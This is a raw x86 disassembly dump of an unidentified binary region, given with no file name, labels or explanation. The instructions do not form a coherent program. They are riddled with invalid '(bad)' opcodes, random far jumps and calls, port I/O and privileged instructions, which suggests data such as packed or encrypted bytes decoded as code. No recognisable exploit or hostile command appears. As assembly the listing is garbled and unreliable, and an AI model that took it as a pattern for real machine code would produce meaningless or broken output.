  406ded:	sbb    edx,edx
  406def:	xchg   ecx,eax
  406df0:	jns    0x406df3
  406df2:	nop
  406df3:	add    dl,bl
  406df5:	jge    0x406e18
  406df7:	cmp    bh,BYTE PTR [edx]
  406df9:	rcl    esp,0x1b
  406dfc:	xchg   edx,eax
  406dfd:	pop    esp
  406dfe:	loop   0x406dd3
  406e00:	imul   BYTE PTR [edx]
  406e02:	mov    edx,0x3aa11a3a
  406e07:	xchg   edx,eax
  406e08:	aaa    
  406e09:	les    eax,FWORD PTR [ebp+0x23]
  406e0c:	cld    
  406e0d:	inc    eax
  406e0e:	loope  0x406dc3
  406e10:	sub    ebx,ecx
  406e12:	sbb    edi,ecx
  406e14:	mov    ecx,0x94e08895
  406e19:	in     al,0x43
  406e1b:	cmp    al,0xe
  406e1d:	xlat   BYTE PTR ds:[ebx]
  406e1e:	pop    edi
  406e1f:	xlat   BYTE PTR ds:[ebx]
  406e20:	mov    ds:0xe3f3ec1f,al
  406e25:	xor    BYTE PTR [eax+0x6863e9b7],cl
  406e2b:	pop    esi
  406e2c:	sub    al,0xf8
  406e2e:	mov    ah,0x94
  406e30:	mov    edx,0xe201b20f
  406e35:	pop    edx
  406e36:	fnstcw WORD PTR [ebx]
  406e38:	jo     0x406df6
  406e3a:	les    ebx,FWORD PTR [esi]
  406e3c:	retf   0x8b4b
  406e3f:	lods   al,BYTE PTR ds:[esi]
  406e40:	enter  0x8470,0xe3
  406e44:	adc    DWORD PTR [edi],esp
  406e46:	dec    esi
  406e47:	jns    0x406eb1
  406e49:	cli    
  406e4a:	adc    DWORD PTR [edi+eax*2+0x29],edi
  406e4e:	xor    eax,0x7087d932
  406e54:	lods   eax,DWORD PTR ds:[esi]
  406e55:	push   0xffffffcb
  406e57:	(bad)  [eax-0x4f]
  406e5a:	cs xchg esp,eax
  406e5c:	sti    
  406e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e5e:	jmp    0x406eb5
  406e60:	imul   ecx,DWORD PTR [edi],0x63c1d7
  406e66:	sub    BYTE PTR [eax],bl
  406e68:	add    ch,dl
  406e6a:	or     ebp,DWORD PTR [edx]
  406e6c:	lahf   
  406e6d:	sub    BYTE PTR [esi+0x7d],ch
  406e70:	add    al,0xbc
  406e72:	jnp    0x406e33
  406e74:	in     eax,dx
  406e75:	push   ds
  406e76:	jns    0x406ef3
  406e78:	imul   edx,DWORD PTR [ecx],0xffffffb9
  406e7b:	jns    0x406ea4
  406e7d:	ins    DWORD PTR es:[edi],dx
  406e7e:	jne    0x406ee0
  406e80:	pop    edi
  406e81:	inc    ebx
  406e82:	lea    bp,[eax+eax*1+0x15]
  406e87:	int    0x2
  406e89:	dec    esp
  406e8a:	(bad)  [edx-0x6b]
  406e8d:	shl    BYTE PTR [edx-0xeeef080],1
  406e93:	or     ah,BYTE PTR [esi+0x496be30f]
  406e99:	ret    
  406e9a:	rcl    BYTE PTR [ebx],1
  406e9c:	sub    BYTE PTR [ebx+0x2],dh
  406e9f:	push   edi
  406ea0:	dec    bl
  406ea2:	xchg   ebp,eax
  406ea3:	loop   0x406e97
  406ea5:	and    DWORD PTR [ebp+edx*4-0x1f3a797f],0x4acdaf36
  406eb0:	ja     0x406eee
  406eb2:	or     eax,0xbf39415e
  406eb7:	ror    DWORD PTR [edx+ecx*1+0x35685871],1
  406ebe:	sti    
  406ebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ec0:	jmp    0x40a7dbb
  406ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ec6:	sub    BYTE PTR [ebx-0x39dfc420],0x24
  406ecd:	dec    ecx
  406ece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ecf:	fs pop eax
  406ed1:	xchg   esi,eax
  406ed2:	add    cl,BYTE PTR [ecx+0x1c6fa5a8]
  406ed8:	jo     0x406eea
  406eda:	inc    ebx
  406edb:	and    eax,0x9f800948
  406ee0:	mov    eax,0xa68b60e8
  406ee5:	fnsave [edx+0x21]
  406ee8:	fcomp  DWORD PTR [ebp-0x72]
  406eeb:	mov    ds:0xfd1c6e6c,al
  406ef0:	lahf   
  406ef1:	pop    esi
  406ef2:	in     eax,0xef
  406ef4:	sbb    al,0xe
  406ef6:	out    dx,eax
  406ef7:	and    eax,DWORD PTR [edi]
  406ef9:	jb     0x406f13
  406efb:	mov    al,0xc
  406efd:	pop    esi
  406efe:	lds    esi,FWORD PTR [ecx]
  406f00:	pop    edx
  406f01:	retf   0x8c6b
  406f04:	ja     0x406e9a
  406f06:	ins    BYTE PTR es:[edi],dx
  406f07:	cmp    DWORD PTR [ebx-0x2d],esp
  406f0a:	retf   
  406f0b:	jmp    0x754:0xac866378
  406f12:	push   esi
  406f13:	jp     0x406f43
  406f15:	add    eax,0xe8b8a746
  406f1a:	sub    BYTE PTR [edi-0x36],al
  406f1d:	push   0x15
  406f1f:	mov    ds:0x121107e,eax
  406f24:	jge    0x406f43
  406f26:	or     bl,BYTE PTR [esp+eax*1]
  406f29:	jecxz  0x406ee7
  406f2b:	and    eax,0xca234075
  406f30:	lss    ebp,FWORD PTR [ecx]
  406f33:	test   eax,0x76f570c
  406f38:	leave  
  406f39:	sti    
  406f3a:	mov    edx,0x9a0b0e6c
  406f3f:	retf   0x4ba5
  406f42:	inc    edi
  406f43:	scas   eax,DWORD PTR es:[edi]
  406f44:	int3   
  406f45:	or     bh,bh
  406f47:	sub    edx,DWORD PTR [ebx-0x2d]
  406f4a:	imul   esp,ecx,0xffffff87
  406f4d:	test   BYTE PTR [edx],cl
  406f4f:	mov    al,0x32
  406f51:	mov    ah,BYTE PTR [edx+0x78]
  406f54:	in     al,0x2
  406f56:	or     eax,0x92ee33fe
  406f5b:	jle    0x406fa7
  406f5d:	or     al,0xa4
  406f5f:	mov    ebp,0xb3b562c2
  406f64:	cmp    edx,DWORD PTR [eax-0x62]
  406f67:	lahf   
  406f68:	xchg   ebx,eax
  406f69:	push   cs
  406f6a:	and    DWORD PTR [ecx-0x76],ecx
  406f6d:	fsubp  st(2),st
  406f6f:	call   0x52f0:0x7571196a
  406f76:	push   ds
  406f77:	add    eax,0x57060d65
  406f7c:	inc    esi
  406f7d:	pop    esi
  406f7e:	out    0xe8,al
  406f80:	pop    edx
  406f81:	shl    DWORD PTR [edi+0x45],cl
  406f84:	cld    
  406f85:	add    al,0xb7
  406f87:	js     0x406ff7
  406f89:	inc    ebp
  406f8a:	or     DWORD PTR [ecx-0x13],ebx
  406f8d:	scas   al,BYTE PTR es:[edi]
  406f8e:	add    BYTE PTR [edi+0x6d0cb19d],0xe6
  406f95:	icebp  
  406f96:	hlt    
  406f97:	mov    esi,0xac0433ca
  406f9c:	jne    0x406f8f
  406f9e:	xchg   esp,eax
  406f9f:	in     eax,0x80
  406fa1:	fisub  WORD PTR [eax+0x3d4f2fa9]
  406fa7:	lods   al,BYTE PTR ds:[esi]
  406fa8:	sub    BYTE PTR [esi],ch
  406faa:	cmp    ebx,eax
  406fac:	cwde   
  406fad:	enter  0xd670,0xba
  406fb1:	push   ebp
  406fb2:	pop    ss
  406fb3:	and    DWORD PTR [ecx+0x18],eax
  406fb6:	inc    eax
  406fb7:	imul   esp,esp,0x30cfe71
  406fbd:	aad    0x7e
  406fbf:	loope  0x406fc7
  406fc1:	push   esi
  406fc2:	push   cs
  406fc3:	push   0x1805e96f
  406fc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fc9:	adc    cl,BYTE PTR [edx]
  406fcb:	jae    0x406faa
  406fcd:	sbb    BYTE PTR [edx],0x73
  406fd0:	pop    edx
  406fd1:	stos   DWORD PTR es:[edi],eax
  406fd2:	(bad)  
  406fd3:	push   cs
  406fd4:	sub    DWORD PTR [ebx],ebp
  406fd6:	scas   eax,DWORD PTR es:[edi]
  406fd7:	adc    eax,0x52aaf7d9
  406fdc:	test   al,0xa1
  406fde:	pop    eax
  406fdf:	sub    cl,BYTE PTR [edx+0x4e]
  406fe2:	test   al,0x61
  406fe4:	cli    
  406fe5:	xor    BYTE PTR [ebx-0x57436816],0x9f
  406fec:	and    DWORD PTR [ecx-0x7929e9ac],edx
  406ff2:	imul   esp,DWORD PTR [ebp+0x7fe8424],0x4675663b
  406ffc:	ins    BYTE PTR es:[edi],dx
  406ffd:	jecxz  0x407003
  406fff:	cmp    ch,BYTE PTR [ebx+0x2e]
  407002:	pop    eax
  407003:	popa   
  407004:	mov    ebx,0xa599451
  407009:	fcomi  st,st(5)
  40700b:	add    DWORD PTR ds:0xd24e323f,ebp
  407011:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  407013:	jg     0x406ffc
  407015:	psrlq  mm1,mm3
  407018:	xor    al,0x2c
  40701a:	shl    BYTE PTR [esi+ebx*2+0x52],cl
  40701e:	lods   eax,DWORD PTR ds:[esi]
  40701f:	repnz push esp
  407021:	mov    eax,ds:0x436686ff
  407026:	and    al,0xe4
  407028:	(bad)  
  40702b:	ja     0x406fca
  40702d:	jg     0x40708d
  40702f:	cmp    eax,0x252ac051
  407034:	ficom  DWORD PTR [esi]
  407036:	inc    eax
  407037:	jo     0x407098
  407039:	sbb    eax,edi
  40703b:	pop    ebp
  40703c:	mov    ebp,0xeb7f69e4
  407041:	add    ch,ch
  407043:	pop    ss
  407044:	mov    cl,0x75
  407046:	cmc    
  407047:	cmc    
  407048:	pop    esi
  407049:	int    0xba
  40704b:	icebp  
  40704c:	je     0x407010
  40704e:	jp     0x40707f
  407050:	add    DWORD PTR [esi+0x60],0x8
  407054:	dec    edx
  407055:	pop    eax
  407056:	dec    ecx
  407057:	mov    eax,edx
  407059:	leave  
  40705a:	(bad)
  40705d:	cmp    ecx,DWORD PTR [eiz*4+0x14dd2c8e]
  407064:	sbb    edi,DWORD PTR fs:[eax-0x3f717a4f]
  40706b:	add    BYTE PTR ds:0x96382c71,dl
  407071:	push   edi
  407072:	test   dh,dh
  407074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407075:	scas   eax,DWORD PTR es:[edi]
  407076:	cmp    al,0xde
  407078:	and    cl,BYTE PTR [ecx+0x262fe7ab]
  40707e:	mov    ebx,0xfe6b77b3
  407083:	dec    edi
  407084:	sbb    dh,cl
  407086:	jne    0x407059
  407088:	mov    edx,0x95c7bd30
  40708d:	repz jmp 0x407020
  407090:	jmp    0x1132:0x64f3cb55
  407097:	pop    es
  407098:	mov    edx,0xae7db7de
  40709d:	test   DWORD PTR [ecx],edx
  40709f:	iret   
  4070a0:	push   ds
  4070a1:	xor    eax,DWORD PTR ds:0xf8980e02
  4070a7:	push   0xd17135fb
  4070ac:	enter  0x70de,0x7
  4070b0:	jecxz  0x4070c7
  4070b2:	adc    ah,BYTE PTR [edi+ebx*1+0x30]
  4070b6:	cmp    eax,0x5e22c2a3
  4070bb:	iret   
  4070bc:	adc    BYTE PTR [edi+0x3d],0x3
  4070c0:	jl     0x40713b
  4070c2:	adc    BYTE PTR [edx],ch
  4070c4:	jmp    0x5c3:0x65971c48
  4070cb:	xor    eax,0xae8b4917
  4070d0:	int3   
  4070d1:	scas   eax,DWORD PTR es:[edi]
  4070d2:	xor    BYTE PTR [ebp+0x72eb700f],bh
  4070d8:	je     0x407151
  4070da:	fs or  dh,bh
  4070dd:	aaa    
  4070de:	xor    ebx,DWORD PTR [ebx-0x7addfd4]
  4070e4:	loope  0x40714a
  4070e6:	push   eax
  4070e7:	add    ah,BYTE PTR [edx-0x1c90815e]
  4070ed:	dec    ebx
  4070ee:	sar    BYTE PTR [eax+0x5a0c19a5],0xb1
  4070f5:	stc    
  4070f6:	sbb    cl,BYTE PTR [ecx]
  4070f8:	adc    al,0x26
  4070fa:	daa    
  4070fb:	ja     0x40709d
  4070fd:	mov    WORD PTR [esi-0x31],es
  407100:	mov    esp,DWORD PTR [edi-0x7d]
  407103:	scas   al,BYTE PTR es:[edi]
  407104:	mov    edi,0x3edbbc33
  407109:	adc    eax,0x67f6f73a
  40710e:	and    edi,DWORD PTR [esi+0x1244ec16]
  407114:	mov    ebx,0x72af4e6c
  407119:	mov    ch,0xf6
  40711b:	shr    ecx,1
  40711d:	scas   al,BYTE PTR es:[edi]
  40711e:	jb     0x4070c7
  407120:	cmp    al,0x69
  407122:	sbb    ch,BYTE PTR [ebp+0x5b74dd4b]
  407128:	ret    0x7f9
  40712b:	shl    BYTE PTR ds:0x29a3a4d,1
  407131:	in     al,0x9b
  407133:	mov    BYTE PTR [ebx+0x4c],dh
  407136:	outs   dx,BYTE PTR ds:[esi]
  407137:	sbb    DWORD PTR [edx+ebp*4],ecx
  40713a:	test   eax,0x194fd12c
  40713f:	aas    
  407140:	std    
  407141:	jg     0x4070f6
  407143:	ror    BYTE PTR [edx+0x7b],1
  407146:	mov    dh,0xe5
  407148:	xor    al,0xbf
  40714a:	xor    eax,0x4c187a52
  40714f:	hlt    
  407150:	imul   esp,edx,0x99356aa9
  407156:	ja     0x40713d
  407158:	sub    DWORD PTR [eax],ebp
  40715a:	arpl   WORD PTR [eax-0x6e],sp
  40715d:	jmp    0xbfa6:0xe7fb1c1e
  407164:	fdivp  st(7),st
  407166:	mov    al,ds:0xac65d3a0
  40716b:	mov    edx,0x487ee60c
  407170:	bndldx (bad),[edx-0x1b4c3eaf]
  407177:	dec    esp
  407178:	adc    eax,0x6eeec6b4
  40717d:	shl    DWORD PTR [ecx+0x71344ac],0x5
  407184:	lahf   
  407185:	mov    ecx,edi
  407187:	stos   BYTE PTR es:[edi],al
  407188:	adc    DWORD PTR [ecx+0x65fa99fc],ebx
  40718e:	jmp    0xc61:0x9e95c28
  407195:	mov    cl,0xd9
  407197:	sbb    ecx,ebp
  407199:	mov    edi,0xebbb451c
  40719e:	push   ecx
  40719f:	int3   
  4071a0:	into   
  4071a1:	or     al,0x19
  4071a3:	sbb    BYTE PTR [ebp+0x54],dh
  4071a6:	ins    BYTE PTR es:[edi],dx
  4071a7:	jecxz  0x40712e
  4071a9:	lods   eax,DWORD PTR ds:[esi]
  4071aa:	mov    DWORD PTR [ecx+esi*4-0x4c859841],esi
  4071b1:	and    bh,BYTE PTR [esi-0x544febc]
  4071b7:	test   al,0xbc
  4071b9:	jge    0x407149
  4071bb:	push   es
  4071bc:	mov    dh,0x25
  4071be:	jp     0x4071ce
  4071c0:	loop   0x4071ec
  4071c2:	or     dh,dl
  4071c4:	dec    eax
  4071c5:	xor    eax,0xe93eaccc
  4071ca:	nop
  4071cb:	(bad)  
  4071cd:	outs   dx,DWORD PTR ds:[esi]
  4071ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071cf:	xor    eax,0xe12d20cd
  4071d4:	jo     0x40721d
  4071d6:	popf   
  4071d7:	jne    0x4071bd
  4071d9:	lds    esi,FWORD PTR [ebx+0x66777c5]
  4071df:	mov    al,0x8b
  4071e1:	icebp  
  4071e2:	call   DWORD PTR [edx*4-0x1e8b6328]
  4071e9:	push   ebx
  4071ea:	fwait
  4071eb:	jle    0x407235
  4071ed:	mov    ds:0x97dcef88,eax
  4071f2:	adc    BYTE PTR [esp+edi*4-0x22b1d79],bl
  4071f9:	mov    bh,0x3f
  4071fb:	adc    al,0xf9
  4071fd:	ror    BYTE PTR [ebx+0x24],0xec
  407201:	daa    
  407202:	mov    ds:0x75bf65fa,al
  407207:	fdivr  st,st(2)
  407209:	int3   
  40720a:	out    dx,al
  40720b:	ror    DWORD PTR ds:0x4fba45e0,1
  407211:	xchg   esi,eax
  407212:	inc    ebx
  407213:	pop    esp
  407214:	stc    
  407215:	mov    eax,0x644af19
  40721a:	ret    
  40721b:	ffreep st(6)
  40721d:	add    edi,0x46
  407220:	sbb    eax,esi
  407222:	punpckhbw mm2,QWORD PTR [ebp-0x27]
  407226:	mov    al,ds:0x7c29fb72
  40722b:	cmp    al,0x36
  40722d:	mul    BYTE PTR [ebp-0x49]
  407230:	ret    0xb656
  407233:	mov    al,0xea
  407235:	jae    0x4072af
  407237:	jo     0x4072ac
  407239:	js     0x40722e
  40723b:	arpl   WORD PTR [ecx-0x6d],bp
  40723e:	ror    BYTE PTR [esp+eax*1-0x6b00cf8f],1
  407245:	or     eax,DWORD PTR [esi-0x51]
  407248:	dec    BYTE PTR [ebx+0x25]
  40724b:	mov    edx,0x79be617e
  407250:	dec    ebx
  407251:	mov    cl,0xe8
  407253:	pop    ecx
  407254:	xor    ecx,esp
  407256:	(bad)  
  407257:	push   edx
  407258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407259:	les    edi,FWORD PTR [ebp+0xa]
  40725c:	push   esi
  40725d:	or     ah,BYTE PTR ds:0x955ad769
  407263:	cdq    
  407264:	xor    eax,0x1342403b
  407269:	std    
  40726a:	data16 jnp 0x4072d6
  40726d:	add    ebx,DWORD PTR [eax]
  40726f:	xchg   BYTE PTR [ebp+0x583932d1],dh
  407275:	lods   al,BYTE PTR ds:[esi]
  407276:	jg     0x407261
  407278:	xchg   ecx,eax
  407279:	addr16 popf 
  40727b:	pop    ss
  40727c:	jno    0x4072f8
  40727e:	jo     0x407242
  407280:	push   0xffffff91
  407282:	retf   0xdc42
  407285:	fimul  WORD PTR [ebp+0x64]
  407288:	push   ss
  407289:	dec    ecx
  40728a:	iret   
  40728b:	cmp    BYTE PTR [ebx+ebx*2+0x22],al
  40728f:	push   0x377372d3
  407294:	arpl   WORD PTR [ebx],cx
  407296:	inc    esi
  407297:	dec    edi
  407298:	xor    ch,BYTE PTR [edx]
  40729a:	in     al,dx
  40729b:	out    dx,al
  40729c:	js     0x4072f2
  40729e:	inc    esi
  40729f:	shrd   edi,edi,0xdf
  4072a3:	out    0x66,al
  4072a5:	mov    dh,0xf1
  4072a7:	cmp    dl,BYTE PTR [ecx+0x52f7cf6d]
  4072ad:	retf   
  4072ae:	and    edx,edi
  4072b0:	adc    bl,BYTE PTR [edx]
  4072b2:	aad    0xf6
  4072b4:	mov    esp,0xcff53c46
  4072b9:	gs dec eax
  4072bb:	mov    ds:0xb366887d,al
  4072c0:	pop    esi
  4072c1:	xchg   ecx,eax
  4072c2:	out    0x6c,al
  4072c4:	sahf   
  4072c5:	test   DWORD PTR [ebp+ecx*1+0x2f],eax
  4072c9:	test   DWORD PTR [ecx+0x13dc9ee1],esp
  4072cf:	and    dh,bh
  4072d1:	das    
  4072d2:	and    eax,0x461b5f86
  4072d7:	(bad)  
  4072d8:	inc    edx
  4072d9:	mov    dl,0x52
  4072db:	mov    edx,DWORD PTR [esi]
  4072dd:	cs out dx,eax
  4072df:	imul   ebx,DWORD PTR [esi],0x40288271
  4072e5:	mov    ecx,DWORD PTR ds:0xff9cd03
  4072eb:	adc    al,0x3c
  4072ed:	inc    ebx
  4072ee:	push   esp
  4072ef:	out    0xdd,eax
  4072f1:	in     al,0x29
  4072f3:	push   ss
  4072f4:	xchg   ah,al
  4072f6:	cmp    ebx,DWORD PTR [edi+0x19]
  4072f9:	jbe    0x40734f
  4072fb:	retf   0x6cc8
  4072fe:	jb     0x40736b
  407300:	inc    esi
  407301:	fisttp DWORD PTR [ebx-0x66]
  407304:	out    dx,eax
  407305:	int3   
  407306:	mov    BYTE PTR [ebp-0x3274c337],ch
  40730c:	sahf   
  40730d:	pushf  
  40730e:	neg    DWORD PTR [esi+0x1]
  407311:	mov    esi,0x522ad95c
  407316:	arpl   WORD PTR [ebp+0x1750eff4],ax
  40731c:	lea    esi,[esi-0x45914c26]
  407322:	xchg   esi,eax
  407323:	popf   
  407324:	imul   eax,DWORD PTR [eax],0x6e
  407327:	sub    edx,DWORD PTR [ebx-0x2c34ae1]
  40732d:	in     al,0xe5
  40732f:	ins    DWORD PTR es:[edi],dx
  407330:	cmp    al,0x1e
  407332:	push   cs
  407333:	adc    ecx,DWORD PTR [ecx]
  407335:	mov    ebp,0xacd847af
  40733a:	scas   eax,DWORD PTR es:[edi]
  40733b:	sub    ebx,DWORD PTR [ebp-0x5f]
  40733e:	retf   
  40733f:	jmp    0xc9be:0x63d0f190
  407346:	out    0xbd,eax
  407348:	test   esi,ebp
  40734a:	and    al,0x8c
  40734c:	sub    esp,edx
  40734e:	push   edi
  40734f:	sbb    edi,DWORD PTR ds:0x9bc683f6
  407355:	mov    al,ds:0x638b83d3
  40735a:	adc    DWORD PTR [ecx-0x65935484],ebx
  407360:	loop   0x40733d
  407362:	xchg   edx,eax
  407363:	(bad)  
  407364:	aam    0x26
  407366:	xchg   esi,eax
  407367:	inc    edi
  407368:	out    dx,eax
  407369:	jmp    0x1992:0x3be9c58c
  407370:	lods   eax,DWORD PTR ds:[esi]
  407371:	cli    
  407372:	int    0x81
  407374:	add    eax,0x511c8d45
  407379:	mov    dl,0xab
  40737b:	adc    BYTE PTR [eax],dl
  40737d:	retf   
  40737e:	mov    ch,0x5e
  407380:	out    0x22,eax
  407382:	ins    DWORD PTR es:[edi],dx
  407383:	in     al,dx
  407384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407385:	ret    
  407386:	out    0x2d,al
  407388:	mov    al,0x3d
  40738a:	mov    ds:0x3079b08e,al
  40738f:	ja     0x4073c3
  407391:	fsubrp st(3),st
  407393:	inc    eax
  407394:	and    BYTE PTR [edi-0x35],dl
  407397:	ror    BYTE PTR [esi+0xd],1
  40739a:	xchg   DWORD PTR [eax+0x1a],eax
  40739d:	adc    DWORD PTR [ebx-0x7f],0xf39051b5
  4073a4:	scas   eax,DWORD PTR es:[edi]
  4073a5:	add    DWORD PTR [edi+0x7874a837],edi
  4073ab:	in     eax,0x7f
  4073ad:	mov    ss,WORD PTR [eax+0x73ffda67]
  4073b3:	push   esi
  4073b4:	mov    cs,WORD PTR [ebp-0x76065112]
  4073ba:	les    ecx,FWORD PTR [eax+0x55]
  4073bd:	sbb    edx,DWORD PTR [esi-0x2479263b]
  4073c3:	xor    eax,0x65393dcc
  4073c8:	ins    DWORD PTR es:[edi],dx
  4073c9:	sub    al,0x59
  4073cb:	cdq    
  4073cc:	mov    esi,0xebc78fe9
  4073d1:	nop
  4073d2:	aas    
  4073d3:	xor    DWORD PTR [edi-0x5db96b0f],esp
  4073d9:	pusha  
  4073da:	adc    al,0xc3
  4073dc:	test   dl,cl
  4073de:	icebp  
  4073df:	jns    0x4073ca
  4073e1:	sub    eax,0x3801e952
  4073e6:	aaa    
  4073e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073e8:	adc    eax,0xd271a0a
  4073ed:	sbb    eax,0xc2a67781
  4073f2:	push   edi
  4073f3:	adc    ah,BYTE PTR [esi-0x2]
  4073f6:	psubsw mm4,QWORD PTR [esp+ebp*2+0x1daa297a]
  4073fe:	xchg   esi,eax
  4073ff:	shl    BYTE PTR [ebx+0x33],0x12
  407403:	mov    eax,0xf6c3bf94
  407408:	mov    ebp,0xe59b7b23
  40740d:	dec    edi
  40740e:	mov    ebp,0xd3dac517
  407413:	call   0x47f2a2f3
  407418:	stos   BYTE PTR es:[edi],al
  407419:	pop    es
  40741a:	ss (bad) 
  40741c:	idiv   BYTE PTR [edi-0x615fdf40]
  407422:	neg    BYTE PTR [ecx+0x5d]
  407425:	add    al,0x3d
  407427:	xchg   esi,eax
  407428:	inc    edi
  407429:	inc    esi
  40742a:	mov    ecx,0x9cbd9ffb
  40742f:	pushf  
  407430:	(bad)  
  407431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407432:	jne    0x4073dd
  407434:	(bad)  
  407435:	pop    ss
  407436:	call   0x570c79c
  40743b:	mov    eax,ds:0x85ff341a
  407440:	pop    eax
  407441:	sbb    edi,DWORD PTR cs:[esi+ebx*4-0x6d]
  407446:	(bad)  
  407447:	mov    esp,DWORD PTR [eax]
  407449:	pushf  
  40744a:	std    
  40744b:	mov    ebx,0x7cf98313
  407450:	outs   dx,BYTE PTR ds:[esi]
  407451:	fisub  DWORD PTR [edx+0x34]
  407454:	jg     0x4073e3
  407456:	dec    ebp
  407457:	and    eax,0x8266fe56
  40745c:	call   0x73e7810a
  407461:	jnp    0x407452
  407463:	rcl    DWORD PTR ds:0xcc15a895,cl
  407469:	cwde   
  40746a:	mov    dl,0xd1
  40746c:	jmp    0xda0:0xb8cce92a
  407473:	(bad)  
  407474:	push   edx
  407475:	inc    esi
  407476:	popa   
  407477:	push   0xffffff9a
  407479:	push   ecx
  40747a:	mov    ebp,0xde42b249
  40747f:	add    DWORD PTR [ecx+0x51],ebx
  407482:	dec    edx
  407483:	fs mov bl,0x88
  407486:	dec    ebp
  407487:	les    esp,FWORD PTR [esi-0x1f]
  40748a:	lea    edx,[esi*1-0x52d6840a]
  407491:	jp     0x4074de
  407493:	xor    bl,BYTE PTR [edi]
  407495:	pop    es
  407496:	sub    esi,esi
  407498:	inc    bh
  40749a:	ror    bh,1
  40749c:	ror    dh,1
  40749e:	inc    esi
  40749f:	jmp    0x69ed:0x9c90b2c8
  4074a6:	es ins DWORD PTR es:[di],dx
  4074a9:	and    al,0x82
  4074ab:	ja     0x407474
  4074ad:	adc    dl,0x20
  4074b0:	scas   al,BYTE PTR es:[edi]
  4074b1:	push   edx
  4074b2:	or     eax,0xb2f9708b
  4074b7:	jae    0x4074fa
  4074b9:	jl     0x40752c
  4074bb:	push   edi
  4074bc:	mov    al,0x68
  4074bf:	xchg   ebx,eax
  4074c0:	xor    al,0xd
  4074c2:	and    al,0x94
  4074c4:	test   ebx,0x7ea6055d
  4074ca:	mov    dh,0x25
  4074cc:	hlt    
  4074cd:	and    DWORD PTR [edi-0x39],ebp
  4074d0:	jns    0x4074f8
  4074d2:	call   0x7207d431
  4074d7:	cs pop eax
  4074d9:	cmp    esi,DWORD PTR [edx+0x427e26cf]
  4074df:	mov    bh,0xbf
  4074e1:	xor    edx,DWORD PTR [esp+edi*1]
  4074e4:	pop    eax
  4074e5:	fadd   QWORD PTR [esi+0x18]
  4074e8:	pushf  
  4074e9:	push   ecx
  4074ea:	leave  
  4074eb:	cdq    
  4074ec:	xor    eax,0xcc7b3883
  4074f1:	inc    edx
  4074f2:	sbb    edx,eax
  4074f4:	gs mov dh,0x56
  4074f7:	mov    dh,0x2e
  4074f9:	test   BYTE PTR [ecx+0x7f21163b],0x85
  407500:	(bad)  [ebp+0x67]
  407503:	cli    
  407504:	mov    WORD PTR [esi+0xe],?
  407507:	shl    BYTE PTR [edx-0x65],cl
  40750a:	or     eax,0x3c4a6fc7
  40750f:	orps   xmm3,XMMWORD PTR [ecx-0x6d]
  407513:	fsub   QWORD PTR [eax+0x1e]
  407516:	mov    edx,0xef5de758
  40751b:	or     DWORD PTR [ecx],0x961e63fe
  407521:	ins    DWORD PTR es:[edi],dx
  407522:	pop    ds
  407523:	xchg   ebx,eax
  407524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407525:	and    ch,0xbf
  407528:	es js  0x4074d4
  40752b:	push   eax
  40752c:	push   esp
  40752d:	or     al,BYTE PTR [ebx+eiz*4-0x6]
  407531:	add    al,0xd3
  407533:	bound  ebx,QWORD PTR [edi+0x42]
  407536:	dec    esi
  407537:	push   eax
  407538:	or     BYTE PTR [edi+0x188b3f08],0xb7
  40753f:	sidtd  [edx]
  407542:	push   esi
  407543:	add    esp,DWORD PTR [esi-0x59792409]
  407549:	mov    esi,gs
  40754b:	sahf   
  40754c:	push   eax
  40754d:	ds sub eax,0xb8c620c0
  407553:	and    al,0x17
  407555:	mov    esp,0x4a446188
  40755a:	cmp    esp,ebx
  40755c:	leave  
  40755d:	inc    ebp
  40755e:	mov    ebx,0x43025ed7
  407563:	in     eax,0x99
  407565:	pop    ebp
  407566:	loope  0x4075ae
  407568:	fmul   QWORD PTR [esi-0x3fa20266]
  40756e:	push   edi
  40756f:	outs   dx,BYTE PTR ds:[esi]
  407570:	int    0xb9
  407572:	dec    eax
  407573:	cs jnp 0x40759d
  407576:	mov    ds:0xdf470f6,eax
  40757b:	add    BYTE PTR [edi],dl
  40757d:	adc    esi,DWORD PTR [edi+0x4ccbe4e6]
  407583:	mov    bl,0xff
  407585:	in     al,dx
  407586:	xor    DWORD PTR [edx],esi
  407588:	ret    
  407589:	outs   dx,BYTE PTR ds:[esi]
  40758a:	shr    DWORD PTR [eax+edi*1-0x367bfab],1
  407591:	cwde   
  407592:	sbb    BYTE PTR [esi],0xa9
  407595:	fstp   DWORD PTR [edi-0x56]
  407598:	push   es
  407599:	push   0xd00e48e5
  40759e:	mov    ch,0x2d
  4075a0:	fsub   st(4),st
  4075a2:	dec    edi
  4075a3:	pop    ss
  4075a4:	push   esp
  4075a5:	add    BYTE PTR [ecx],ah
  4075a7:	inc    edx
  4075a8:	fs aaa 
  4075aa:	xor    al,0xcf
  4075ac:	cli    
  4075ad:	add    ch,BYTE PTR [ebx-0x22966aa0]
  4075b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075b4:	jno    0x4075c3
  4075b6:	aaa    
  4075b7:	inc    edi
  4075b8:	push   ecx
  4075b9:	(bad)  
  4075ba:	push   edi
  4075bb:	dec    esp
  4075bc:	jle    0x407562
  4075be:	sub    ebp,DWORD PTR [esi+0x4c]
  4075c1:	aam    0x19
  4075c3:	cmp    al,0x2c
  4075c5:	sbb    al,0x5e
  4075c7:	fmulp  st(5),st
  4075c9:	ret    0x4542
  4075cc:	xchg   edi,eax
  4075cd:	loope  0x40755c
  4075cf:	mov    BYTE PTR cs:[ecx],ah
  4075d2:	loop   0x4075fd
  4075d4:	rol    DWORD PTR [eax-0x4f02722d],1
  4075da:	push   ds
  4075db:	std    
  4075dc:	pop    eax
  4075dd:	(bad)  
  4075de:	cld    
  4075df:	fs aas 
  4075e1:	nop
  4075e2:	or     ch,BYTE PTR [eax+0xb]
  4075e5:	ins    BYTE PTR es:[edi],dx
  4075e6:	pop    edi
